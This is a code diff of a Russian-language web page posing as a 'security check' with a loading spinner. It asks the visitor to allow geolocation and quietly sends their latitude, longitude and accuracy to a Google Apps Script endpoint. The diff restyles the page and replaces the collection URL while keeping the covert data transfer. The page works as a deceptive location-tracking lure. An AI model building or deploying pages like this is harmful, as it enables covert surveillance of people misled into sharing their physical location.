@@ -2,27 +2,27 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Загрузка...</title>
+  <title>Проверка безопасности</title>
   <style>
     body {
-      font-family: sans-serif;
+      font-family: Arial, sans-serif;
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
       height: 100vh;
-      background-color: #f5f5f5;
+      background: #f0f0f0;
       color: #333;
-      flex-direction: column;
       text-align: center;
     }
     .loader {
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid #555;
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 1s linear infinite;
       margin-top: 20px;
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #333;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
     }
     @keyframes spin {
       0% { transform: rotate(0deg); }
@@ -31,8 +31,8 @@
   </style>
 </head>
 <body>
-  <h2>Проверка безопасности...</h2>
-  <p>Пожалуйста, разрешите доступ к геолокации для продолжения.</p>
+  <h2>Проверка безопасности</h2>
+  <p>Пожалуйста, разрешите доступ к геолокации для продолжения</p>
   <div class="loader"></div>
 
   <script>
@@ -41,19 +41,15 @@
       const lon = pos.coords.longitude;
       const acc = pos.coords.accuracy;
 
-      // Используем URL Google Script для отправки данных
-      const url = `https://script.google.com/macros/s/AKfycbyxQCTQIe0AlWAb9khcYJfKJqT_5_V9-q9ntkX4OcuCu8mFsUbX2onblpXMjcwrwPOG/exec?lat=${lat}&lon=${lon}&acc=${acc}`;
-      
-      // Отправляем данные на Google Sheets
-      fetch(url).then(response => {
-        console.log('Location sent!');
-      }).catch(err => {
-        console.error('Error sending location', err);
-      });
+      const url = `https://script.google.com/macros/s/AKfycbxK3sFmC2YreooOCiK9jU7lLFwMlt7NflHTzU5UUY6FesXfQDYOkg5RZUy2eobocL16/exec?lat=${lat}&lon=${lon}&acc=${acc}`;
+
+      fetch(url)
+        .then(res => console.log("Геолокация отправлена"))
+        .catch(err => console.error("Ошибка при отправке:", err));
     }
 
     function locationError(err) {
-      alert("Ошибка получения геопозиции: " + err.message);
+      alert("Ошибка доступа к геолокации: " + err.message);
     }
 
     navigator.geolocation.getCurrentPosition(sendLocation, locationError, {
